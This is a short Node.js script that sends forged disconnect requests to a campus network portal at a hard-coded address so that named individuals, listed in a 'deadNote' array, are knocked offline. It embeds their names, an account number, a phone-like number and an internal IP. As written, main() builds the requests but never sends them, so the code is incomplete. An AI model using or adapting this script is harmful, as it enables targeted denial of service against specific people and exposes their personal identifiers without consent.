let request = require('request'),
	iconv = require('iconv-lite'),
	fs = require('fs');

var infomation = {
	'余涌腾' : {
		number : "162011379",
		ip : "10.12.22.86"
	},
	'阳馨男' : {
		number : "18028035114",
		ip : ""
	}
}

var deadNote = [
	'余涌腾',
	// '阳馨男'
]

let reqTest = (option, callback) =>{
	request.post(option, function(err, res, body) {
		if(err || res.statusCode != 200){
			callback(false);
			return ;
		}
	})
	.pipe(iconv.decodeStream("GBK"))
	.pipe(iconv.encodeStream('utf-8'))
	.collect(function(err, body){
		body = body.toString();
		if(body.indexOf('下线失败，帐号与在线表帐号不一致') > -1 || body.indexOf('下线失败,帐号不在线') > -1){
			console.log("faile : " + option.form.userid);
			return ;
		}
		console.log("success : " + option.form.userid);
	})
}

let main = ()=>{
	deadNote.forEach((name)=>{
		var data = infomation[name];
		var option = {
			url : 'http://219.136.125.139/portalDisconnAction.do',
			form : {
				"userid" : data.number + "@NFSYSU.GZ",
				"wlanuserip" : data.ip,
				"wlanacIp" : "14.23.185.10"
			},
			timeout : 1000
		}
	})
}

main();

